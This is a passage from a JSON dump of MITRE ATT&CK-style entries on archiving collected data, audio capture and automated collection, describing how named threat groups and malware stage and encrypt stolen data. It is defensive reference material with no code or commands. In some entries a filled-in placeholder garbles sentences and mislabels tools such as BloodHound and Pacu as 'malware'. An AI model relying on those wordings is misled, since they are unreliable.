                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfltration; APT29 also compressed text files into zipped archives.[71][72][73]"
                    },
                    "G0054": {
                        "ID": "G0054",
                        "Name": "Sowbug",
                        "Description": "<name> extracted documents and bundled them into a RAR archive.[74]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has leveraged  xcopy, 7zip, and RAR to stage and compress collected documents prior to exfiltration.[75]"
                    },
                    "S0647": {
                        "ID": "S0647",
                        "Name": "Turian",
                        "Description": "<name> can use WinRAR to create a password-protected archive for files of interest.[76]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has encrypted files stolen from connected USB drives into a RAR file before exfiltration.[77]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has archived the ntds.dit database as a multi-volume password-protected archive with 7-Zip.[78]"
                    },
                    "S0466": {
                        "ID": "S0466",
                        "Name": "WindTail",
                        "Description": "<name> has the ability to use the macOS built-in zip utility to archive files.[79]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has archived data into ZIP files on compromised machines.[80]"
                    }
                }
            },
            "002": {
                "name": "Archive via Library",
                "href": "/techniques/T1560/002",
                "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile [1], libzip [2], and zlib [3]. Most libraries include functionality to encrypt and/or compress data.Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
                "Procedure": {
                    "S0642": {
                        "ID": "S0642",
                        "Name": "BADFLICK",
                        "Description": "<name> has compressed data using the aPLib compression library.[4]"
                    },
                    "S0127": {
                        "ID": "S0127",
                        "Name": "BBSRAT",
                        "Description": "<name> can compress data with ZLIB prior to sending it back to the C2 server.[5]"
                    },
                    "S0348": {
                        "ID": "S0348",
                        "Name": "Cardinal RAT",
                        "Description": "<name> applies compression to C2 traffic using the ZLIB library.[6]"
                    },
                    "S0354": {
                        "ID": "S0354",
                        "Name": "Denis",
                        "Description": "<name> compressed collected data using zlib.[7]"
                    },
                    "S0091": {
                        "ID": "S0091",
                        "Name": "Epic",
                        "Description": "<name> compresses the collected data with bzip2 before sending it to the C2 server.[8]"
                    },
                    "S0661": {
                        "ID": "S0661",
                        "Name": "FoggyWeb",
                        "Description": "<name> can invoke the Common.Compress method to compress data with the C# GZipStream compression class.[9]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> has compressed collected files with zLib.[10]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can use zlib to compress and decompress data.[11][12]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.[13][14]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> scrambles and encrypts data using AES256 before sending it to the C2 server.[15][16]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> compressed data with zlib prior to sending it over C2.[17]"
                    },
                    "S0467": {
                        "ID": "S0467",
                        "Name": "TajMahal",
                        "Description": "<name> has the ability to use the open source libraries XZip/Xunzip and zlib to compress files.[18]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has used RAR to compress, encrypt, and password-protect files prior to exfiltration.[19]"
                    },
                    "S0086": {
                        "ID": "S0086",
                        "Name": "ZLib",
                        "Description": "The <name> backdoor compresses communications using the standard Zlib compression library.[20]"
                    }
                }
            },
            "003": {
                "name": "Archive via Custom Method",
                "href": "/techniques/T1560/003",
                "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.[1]",
                "Procedure": {
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "<name> compresses output data generated by command execution with a custom implementation of the Lempel\u2013Ziv\u2013Welch (LZW) algorithm.[1]"
                    },
                    "S0092": {
                        "ID": "S0092",
                        "Name": "Agent.btz",
                        "Description": "<name> saves system information into an XML file that is then XOR-encoded.[2]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name> encrypts collected data with a custom implementation of Blowfish and RSA ciphers.[3]"
                    },
                    "S0657": {
                        "ID": "S0657",
                        "Name": "BLUELIGHT",
                        "Description": "<name> has encoded data into a binary blob using XOR.[4]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 hex-encoded PII data prior to exfiltration.[5]"
                    },
                    "G0052": {
                        "ID": "G0052",
                        "Name": "CopyKittens",
                        "Description": "<name> encrypts data with a substitute cipher prior to exfiltration.[6]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "Modules can be pushed to and executed by <name> that copy data to a staging area, compress it, and XOR encrypt it.[7]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key, and Base64 with character permutation.[8][9]"
                    },
                    "S0036": {
                        "ID": "S0036",
                        "Name": "FLASHFLOOD",
                        "Description": "<name> employs the same encoding scheme as SPACESHIP for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.[10]"
                    },
                    "S0661": {
                        "ID": "S0661",
                        "Name": "FoggyWeb",
                        "Description": "<name> can use a dynamic XOR key and a custom XOR methodology to encode data before exfiltration. Also, <name> can encode C2 command output within a legitimate WebP file.[11]"
                    },
                    "S0503": {
                        "ID": "S0503",
                        "Name": "FrameworkPOS",
                        "Description": "<name> can XOR credit card information before exfiltration.[12]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> has compressed collected files with zLib and encrypted them using an XOR operation with the string key from the command line or qwerasdf if the command line argument doesn\u2019t contain the key. File names are obfuscated using XOR with the same key as the compressed file content.[13]"
                    },
                    "S0391": {
                        "ID": "S0391",
                        "Name": "HAWKBALL",
                        "Description": "<name> has encrypted data with XOR before sending it over the C2 channel.[14]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> uses a variation of the XOR cipher to encrypt files before exfiltration.[15]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used RC4 encryption before exfil.[16]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "A <name> malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.[17][18][19][20]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name>'s collected data is encrypted with AES before exfiltration.[21]"
                    },
                    "S0443": {
                        "ID": "S0443",
                        "Name": "MESSAGETAP",
                        "Description": "<name> has XOR-encrypted and stored contents of SMS messages that matched its target list. [22]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> has used XOR-based encryption for collected files before exfiltration.[23]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has encrypted documents with RC4 prior to exfiltration.[24]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has used a custom encryption algorithm to encrypt collected data.[25]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> has used a custom implementation of AES encryption to encrypt collected data.[26]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> compresses collected files with a simple character replacement scheme before sending them to its C2 server.[27]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> has used AES in CBC mode to encrypt collected data when saving that data to disk.[28]"
                    },
                    "S0072": {
                        "ID": "S0072",
                        "Name": "OwaAuth",
                        "Description": "<name> DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.[29]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> can store collected documents in a custom container after encrypting and compressing them using RC4 and WinRAR.[30]"
                    },
                    "S0169": {
                        "ID": "S0169",
                        "Name": "RawPOS",
                        "Description": "<name> encodes credit card data it collected from the victim with XOR.[31][32][33]"
                    },
                    "S0172": {
                        "ID": "S0172",
                        "Name": "Reaver",
                        "Description": "<name> encrypts collected data with an incremental XOR key prior to exfiltration.[34]"
                    },
                    "S0258": {
                        "ID": "S0258",
                        "Name": "RGDoor",
                        "Description": "<name> encrypts files with XOR before sending them back to the C2 server.[35]"
                    },
                    "S0448": {
                        "ID": "S0448",
                        "Name": "Rising Sun",
                        "Description": "<name> can archive data using RC4 encryption and Base64 encoding prior to exfiltration.[36]"
                    },
                    "S0615": {
                        "ID": "S0615",
                        "Name": "SombRAT",
                        "Description": "<name> has encrypted collected data with AES-256 using a hardcoded key.[37]"
                    },
                    "S0035": {
                        "ID": "S0035",
                        "Name": "SPACESHIP",
                        "Description": "Data <name> copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.[10]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has encrypted collected data using a XOR-based algorithm.[38]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> can compress and encrypt archived files into multiple .sft files with a repeated xor encryption scheme.[39][40]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> encrypts exfiltrated data via C2 with static 31-byte long XOR keys.[41]"
                    },
                    "S1042": {
                        "ID": "S1042",
                        "Name": "SUGARDUMP",
                        "Description": "<name> has encrypted collected data using AES CBC mode and encoded it using Base64.[42]"
                    },
                    "S0098": {
                        "ID": "S0098",
                        "Name": "T9000",
                        "Description": "<name> encrypts collected data using a single byte XOR key.[43]"
                    }
                }
            }
        },
        "tactic": "Collection",
        "description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.[1] Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
        "Procedure": {
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "malware encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.[2]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can encrypt data with 3DES before sending it over to a C2 server.[3]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware has compressed collected data before exfiltration.[4]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[1]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware's backdoor has used LZMA compression and RC4 encryption before exfiltration.[5]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has used ZIP to compress data gathered on a compromised host.[6]"
            },
            "G0001": {
                "ID": "G0001",
                "Name": "Axiom",
                "Description": "malware has compressed and encrypted data prior to exfiltration.[7]"
            },
            "S0093": {
                "ID": "S0093",
                "Name": "Backdoor.Oldrea",
                "Description": "malware writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.[8]"
            },
            "S0521": {
                "ID": "S0521",
                "Name": "BloodHound",
                "Description": "malware can compress data collected by its SharpHound ingestor into a ZIP file to be written to disk.[9][10]"
            },
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware can zip files before exfiltration.[11]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can compress data stolen from the Registry and volume shadow copies prior to exfiltration.[12]"
            },
            "S0454": {
                "ID": "S0454",
                "Name": "Cadelspy",
                "Description": "malware has the ability to compress stolen data into a .cab file.[13]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware can encrypt and store on disk collected data before exfiltration.[14]"
            },
            "S0187": {
                "ID": "S0187",
                "Name": "Daserf",
                "Description": "malware hides collected data in password-protected .rar archives.[15]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has compressed data into .zip files prior to exfiltration.[16]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware packs collected data into a password protected archive.[17]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has been observed encrypting the data it collects before sending it to the C2 server. [18]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can ZIP directories on the target system.[19]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware encrypts collected data using a public key framework before sending it over the C2 channel.[20] Some variants encrypt the collected data with AES and encode it with base64 before transmitting it to the C2 server.[21]"
            },
            "S0343": {
                "ID": "S0343",
                "Name": "Exaramel for Windows",
                "Description": "malware automatically encrypts files before sending them to the C2 server.[22]"
            },
            "S0267": {
                "ID": "S0267",
                "Name": "FELIXROOT",
                "Description": "malware encrypts collected data with AES and Base64 and then sends it to the C2 server.[23]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "Following data collection, malware has compressed log files into a ZIP archive prior to staging and exfiltration.[24]"
            },
            "S0249": {
                "ID": "S0249",
                "Name": "Gold Dragon",
                "Description": "malware encrypts data using Base64 before being sent to the command and control server.[25]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "The malware group has been known to compress data before exfiltration.[26]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware can RC4-encrypt credentials before sending to the C2.[27]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware has encrypted data and files prior to exfiltration.[28]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has compressed exfiltrated data with RAR and used RomeoDelta malware to archive specified directories in .zip format, encrypt the .zip file, and upload it to C2. [29][30][31]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has archived victim's data prior to exfiltration.[32]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware contains a function to encrypt and store emails that it collects.[33]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware has encrypted data before sending it to the server.[34]"
            },
            "S1101": {
                "ID": "S1101",
                "Name": "LoFiSe",
                "Description": "malware can collect files into password-protected ZIP-archives for exfiltration.[35]"
            },
            "G1014": {
                "ID": "G1014",
                "Name": "LuminousMoth",
                "Description": "malware has manually archived stolen files from victim machines before exfiltration.[36]"
            },
            "S0010": {
                "ID": "S0010",
                "Name": "Lurid",
                "Description": "malware can compress data before sending it.[37]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware stores zipped files with profile data from installed web browsers.[38]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has encrypted files and information before exfiltration.[39][40]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware has the ability to compress archived screenshots.[41]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "malware encrypted the collected files' path with AES and then encoded them with base64.[42]"
            },
            "S0517": {
                "ID": "S0517",
                "Name": "Pillowmint",
                "Description": "malware has encrypted stolen credit card information with AES and further encoded it with Base64.[43]"
            },
            "S1012": {
                "ID": "S1012",
                "Name": "PowerLess",
                "Description": "malware can encrypt browser database files prior to exfiltration.[44]"
            },
            "S0113": {
                "ID": "S0113",
                "Name": "Prikormka",
                "Description": "After collecting documents from removable media, malware compresses the collected files, and encrypts it with Blowfish.[45]"
            },
            "S0279": {
                "ID": "S0279",
                "Name": "Proton",
                "Description": "malware zips up files before exfiltrating them.[46]"
            },
            "S0375": {
                "ID": "S0375",
                "Name": "Remexi",
                "Description": "malware encrypts and adds all gathered browser data into files for upload to C2.[47]"
            },
            "S0253": {
                "ID": "S0253",
                "Name": "RunningRAT",
                "Description": "malware contains code to compress files.[25]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware used LZ compression to compress initial reconnaissance reports before sending to the C2.[48]"
            },
            "S0586": {
                "ID": "S0586",
                "Name": "TAINTEDSCRIBE",
                "Description": "malware has used FileReadZipSend to compress a file and send to C2.[49]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware encrypts the collected files using 3-DES.[50]"
            },
            "S0515": {
                "ID": "S0515",
                "Name": "WellMail",
                "Description": "malware can archive files on the compromised host.[51]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware will compress entire ~/Desktop folders excluding all .git folders, but only if the total data size is under 200MB.[52]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware  has used a method similar to RC4 as well as AES for encryption and hexadecimal for encoding data before exfiltration. [53][54][55]"
            }
        }
    },
    "T1123": {
        "ttp_name": "Audio Capture",
        "ttp_id": "T1123",
        "href": "/techniques/T1123",
        "tactic": "Collection",
        "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.[1]Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
        "Procedure": {
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware has used an audio capturing utility known as SOUNDWAVE that captures microphone input.[2]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware's has a plugin that is capable of recording audio using available input sound devices.[1]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware has modules that are capable of capturing audio.[3]"
            },
            "S0454": {
                "ID": "S0454",
                "Name": "Cadelspy",
                "Description": "malware has the ability to record audio from the compromised host.[4]"
            },
            "S0338": {
                "ID": "S0338",
                "Name": "Cobian RAT",
                "Description": "malware has a feature to perform voice recording on the victim\u2019s machine.[5]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware can perform audio surveillance using microphones.[6]"
            },
            "S0334": {
                "ID": "S0334",
                "Name": "DarkComet",
                "Description": "malware can listen in to victims' conversations through the system\u2019s microphone.[7][8]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "malware is capable of performing audio captures.[9]"
            },
            "S0213": {
                "ID": "S0213",
                "Name": "DOGCALL",
                "Description": "malware can capture microphone data from the victim's machine.[10]"
            },
            "S0152": {
                "ID": "S0152",
                "Name": "EvilGrab",
                "Description": "malware has the capability to capture audio from a victim machine.[11]"
            },
            "S0143": {
                "ID": "S0143",
                "Name": "Flame",
                "Description": "malware can record audio using any existing hardware recording devices.[12][13]"
            },
            "S0434": {
                "ID": "S0434",
                "Name": "Imminent Monitor",
                "Description": "malware has a remote microphone monitoring capability.[14][15]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can record sound using input audio devices.[16][17]"
            },
            "S0163": {
                "ID": "S0163",
                "Name": "Janicab",
                "Description": "malware captured audio and sent it out to a C2 server.[18][19]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can capture microphone recordings.[20]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware captures audio from the computer\u2019s microphone.[21][22][23]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware has the ability to record audio.[24]"
            },
            "S0282": {
                "ID": "S0282",
                "Name": "MacSpy",
                "Description": "malware can record the sounds from microphones on a computer.[25]"
            },
            "S0339": {
                "ID": "S0339",
                "Name": "Micropsia",
                "Description": "malware can perform microphone recording.[26]"
            },
            "S0336": {
                "ID": "S0336",
                "Name": "NanoCore",
                "Description": "malware can capture audio feeds from the system.[27][28]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware can load a module to leverage the LAME encoder and mciSendStringW to control and capture audio.[29]"
            },
            "S0194": {
                "ID": "S0194",
                "Name": "PowerSploit",
                "Description": "malware's Get-MicrophoneAudio Exfiltration module can record system microphone audio.[30][31]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can record sound with the microphone.[32]"
            },
            "S0332": {
                "ID": "S0332",
                "Name": "Remcos",
                "Description": "malware can capture data from the system\u2019s microphone.[33]"
            },
            "S0379": {
                "ID": "S0379",
                "Name": "Revenge RAT",
                "Description": "malware has a plugin for microphone interception.[34][35]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware has an audio capture and eavesdropping module.[36]"
            },
            "S0098": {
                "ID": "S0098",
                "Name": "T9000",
                "Description": "malware uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype.[37]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to capture VoiceIP application audio on an infected host.[38]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware can perform audio capture.[39]"
            }
        }
    },
    "T1119": {
        "ttp_name": "Automated Collection",
        "ttp_id": "T1119",
        "href": "/techniques/T1119",
        "tactic": "Collection",
        "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.[1] This functionality could also be built into remote access tools. This technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
        "Procedure": {
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware has automatically collected data from USB drives, keystrokes, and screen images before exfiltration.[2]"
            },
            "G0006": {
                "ID": "G0006",
                "Name": "APT1",
                "Description": "malware used a batch script to perform a series of discovery techniques and saves it to a text file.[3]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[4]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware has automatically collected data about the compromised system.[5]"
            },
            "S0128": {
                "ID": "S0128",
                "Name": "BADNEWS",
                "Description": "malware monitors USB devices and copies files with certain extensions to a predefined directory.[6]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware recursively generates a list of files within a directory and sends them back to the control server.[7]"
            },
            "S1043": {
                "ID": "S1043",
                "Name": "ccf32",
                "Description": "malware can be used to automatically collect files from a compromised host.[8]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used custom DLLs for continuous retrieval of data from memory.[9]"
            },
            "S0244": {
                "ID": "S0244",
                "Name": "Comnie",
                "Description": "malware executes a batch script to store discovery information in %TEMP%\\info.dat and then uploads the temporarily file to the remote C2 server.[10]"
            },
            "G0142": {
                "ID": "G0142",
                "Name": "Confucius",
                "Description": "malware has used a file stealer to steal documents and images with the following extensions: txt, pdf, png, jpg, doc, xls, xlm, odp, ods, odt, rtf, ppt, xlsx, xlsm, docx, pptx, and jpeg.[11]"
            },
            "S0538": {
                "ID": "S0538",
                "Name": "Crutch",
                "Description": "malware can automatically monitor removable drives in a loop and copy interesting files.[12]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware searches for stored credentials associated with cryptocurrency wallets and notifies the command and control server when identified.[13]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can automatically gather the username, domain name, machine name, and other information from a compromised system.[14]"
            },
            "G0053": {
                "ID": "G0053",
                "Name": "FIN5",
                "Description": "malware scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[15]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button.[16][17]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors used Empire to automatically gather the username, domain name, machine name, and other system information.[14]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can monitor files for changes and automatically collect them.[8]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has deployed scripts on compromised systems that automatically scan for interesting documents.[18]"
            },
            "S0597": {
                "ID": "S0597",
                "Name": "GoldFinder",
                "Description": "malware logged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server, including the target C2 URL, HTTP response/status code, HTTP response headers and values, and data received from the C2 node.[19]"
            },
            "S0170": {
                "ID": "S0170",
                "Name": "Helminth",
                "Description": "A malware VBScript receives a batch script to execute a set of commands in a command prompt.[20]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can sort and collect specific documents as well as generate a list of all files on a newly inserted drive and store them in an encrypted file.[21][22]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has performed frequent and scheduled data collection from victim networks.[23]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware can be configured to automatically collect files under a specified directory.[24]"
            },
            "S1101": {
                "ID": "S1101",
                "Name": "LoFiSe",
                "Description": "malware can collect all the files from the working directory every three hours and place them into a password-protected archive for further exfiltration.[25]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used the Csvde tool to collect Active Directory files and data.[26]"
            },
            "S0443": {
                "ID": "S0443",
                "Name": "MESSAGETAP",
                "Description": "malware checks two files, keyword_parm.txt and parm.txt, for instructions on how to target and save data parsed and extracted from SMS message data from the network traffic. If an SMS message contained either a phone number, IMSI number, or keyword that matched the predefined list, it is saved to a CSV file for later theft by the threat actor.[27]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has automatically collected mouse clicks, continuous screenshots on the machine, and set timers to collect the contents of the clipboard and website browsing.[28]"
            },
            "S0339": {
                "ID": "S0339",
                "Name": "Micropsia",
                "Description": "malware executes an RAR tool to recursively archive files based on a predefined list of file extensions (.xls, .xlsx, .csv, .odt, .doc, .docx, .ppt, .pptx, .pdf, .mdb, .accdb, .accde, *.txt).[29]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware used custom batch scripts to collect files automatically from a targeted system.[30]"
            },
            "S0699": {
                "ID": "S0699",
                "Name": "Mythic",
                "Description": "malware supports scripting of file downloads from agents.[31]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can automatically archive collected data.[32]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used automated collection.[33]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used a script to collect information about the infected system.[34]"
            },
            "S1017": {
                "ID": "S1017",
                "Name": "OutSteel",
                "Description": "malware can automatically scan for and collect files with specific extensions.[35]"
            },
            "S1109": {
                "ID": "S1109",
                "Name": "PACEMAKER",
                "Description": "malware can enter a loop to read /proc/ entries every 2 seconds in order to read a target application's memory.[36]"
            },
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "malware can automatically collect data, such as CloudFormation templates, EC2 user data, AWS Inspector reports, and IAM credential reports.[37]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "malware developed a file stealer to search C:\\ and collect files with certain extensions. malware also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.[6]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware used file system monitoring to track modification and enable automatic exfiltration.[38]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware contains a module for recursively parsing through files and directories to gather valid credit card numbers.[39]"
            },
            "S0238": {
                "ID": "S0238",
                "Name": "Proxysvc",
                "Description": "malware automatically collects data about the victim and sends it to the control server.[40]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can conduct an initial scan for Microsoft Word documents on the local system, removable media, and connected network drives, before tagging and collecting them. It can continue tagging documents to collect with follow up scans.[41]"
            },
            "S0684": {
                "ID": "S0684",
                "Name": "ROADTools",
                "Description": "malware automatically gathers data from Azure AD environments using the Azure Graph API.[42]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "Depending on the Linux distribution, malware executes a set of commands to collect device information and sends the collected information to the C2 server.[43]"
            },
